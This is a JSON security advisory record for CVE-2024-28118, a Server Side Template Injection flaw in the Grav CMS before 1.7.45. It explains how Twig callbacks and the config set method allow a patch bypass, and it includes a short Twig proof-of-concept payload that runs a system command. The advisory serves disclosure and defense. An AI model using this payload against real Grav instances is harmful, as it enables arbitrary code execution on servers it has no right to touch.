{
  "Severity": "HIGH",
  "UpdatedAt": "2024-03-22T16:55:41Z",
  "Package": {
    "Ecosystem": "COMPOSER",
    "Name": "getgrav/grav"
  },
  "Advisory": {
    "DatabaseId": 238513,
    "Id": "GSA_kwCzR0hTQS1yNnZ3LTh2OHItcG1wNM4AA6Ox",
    "GhsaId": "GHSA-r6vw-8v8r-pmp4",
    "References": [
      {
        "Url": "https://github.com/getgrav/grav/security/advisories/GHSA-r6vw-8v8r-pmp4"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2024-28118"
      },
      {
        "Url": "https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe"
      },
      {
        "Url": "https://github.com/advisories/GHSA-r6vw-8v8r-pmp4"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-r6vw-8v8r-pmp4"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2024-28118"
      }
    ],
    "Description": "### Summary\nDue to the unrestricted access to twig extension class from grav context, an attacker can redefine config variable. As a result, attacker can bypass previous patch.\n\n### Details\nThe twig context has a function declared called getFunction.\n```php\npublic function getFunction($name)\n    {\n        if (!$this-\u003eextensionInitialized) {\n            $this-\u003einitExtensions();\n        }\n\n        if (isset($this-\u003efunctions[$name])) {\n            return $this-\u003efunctions[$name];\n        }\n\n        foreach ($this-\u003efunctions as $pattern =\u003e $function) {\n            $pattern = str_replace('\\\\*', '(.*?)', preg_quote($pattern, '#'), $count);\n\n            if ($count) {\n                if (preg_match('#^'.$pattern.'$#', $name, $matches)) {\n                    array_shift($matches);\n                    $function-\u003esetArguments($matches);\n\n                    return $function;\n                }\n            }\n        }\n\n        foreach ($this-\u003efunctionCallbacks as $callback) {\n            if (false !== $function = \\call_user_func($callback, $name)) {\n                return $function;\n            }\n        }\n\n        return false;\n    }\n```\nThis function, if the value of `$name` does not exist in `$this-\u003efunctions`, uses call_user_func to execute callback functions stored in `$this-\u003efunctionCallbacks`.\n\nIt is possible to register arbitrary function using registerUndefinedFunctionCallback, but a callback that has already been registered exists and new callbacks added will not be executed.\n\nThe default function callback is as follows:\n```php\n$this-\u003etwig-\u003eregisterUndefinedFunctionCallback(function (string $name) use ($config) {\n                $allowed = $config-\u003eget('system.twig.safe_functions');\n                if (is_array($allowed) and in_array($name, $allowed, true) and function_exists($name)) {\n                    return new TwigFunction($name, $name);\n                }\n                if ($config-\u003eget('system.twig.undefined_functions')) {\n                    if (function_exists($name)) {\n                        if (!Utils::isDangerousFunction($name)) {\n                            user_error(\"PHP function {$name}() was used as Twig function. This is deprecated in Grav 1.7. Please add it to system configuration: `system.twig.safe_functions`\", E_USER_DEPRECATED);\n\n                            return new TwigFunction($name, $name);\n                        }\n\n                        /** @var Debugger $debugger */\n                        $debugger = $this-\u003egrav['debugger'];\n                        $debugger-\u003eaddException(new RuntimeException(\"Blocked potentially dangerous PHP function {$name}() being used as Twig function. If you really want to use it, please add it to system configuration: `system.twig.safe_functions`\"));\n                    }\n\n                    return new TwigFunction($name, static function () {});\n                }\n\n                return false;\n            });\n```\nIf you look at this function, if the value of system.twig.undefined_functions is false, it returns false.\nIn that case, it is possible for our registered callback to be executed.\n\nAt this time, the `Grav\\Common\\Config\\Config` class is loaded within the grav context, and access to the set method is allowed, making it possible to set the value of system.twig.undefined_functions to false.\nAs a result, an attacker can execute any arbitrarily registered callback function.\n\n### PoC\n```\n{{ grav.twig.twig.registerUndefinedFunctionCallback('system') }}\n{% set a = grav.config.set('system.twig.undefined_functions',false) %}\n{{ grav.twig.twig.getFunction('id') }}\n```\n\n![image](https://user-images.githubusercontent.com/46442697/281371295-25174479-e9ab-40ca-8016-99c51f72d7a8.png)\n\n\n### Impact\nTwig processing of static pages can be enabled in the front matter by any administrative user allowed to create or edit pages.\nAs the Twig processor runs unsandboxed, this behavior can be used to gain arbitrary code execution and elevate privileges on the instance.\n",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2024-03-22T16:55:39Z",
    "Severity": "HIGH",
    "Summary": "Server Side Template Injection (SSTI)",
    "UpdatedAt": "2025-01-03T16:06:56Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 8.8,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "1.7.45"
      },
      "VulnerableVersionRange": "\u003c 1.7.45"
    }
  ]
}